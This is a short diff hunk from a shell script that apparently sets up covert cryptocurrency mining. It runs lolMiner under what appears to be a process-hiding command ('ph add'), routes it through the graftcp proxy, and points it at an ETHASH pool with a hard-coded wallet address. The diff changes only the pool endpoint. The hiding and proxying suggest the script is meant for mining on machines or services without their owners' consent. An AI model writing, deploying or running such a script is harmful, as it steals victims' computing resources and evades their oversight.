@@ -40,4 +40,4 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool 172.65.247.152:4444 --user 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 1-999 -n 1)-LOL)
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 1-999 -n 1)-LOL) --ethstratum ETHPROXY
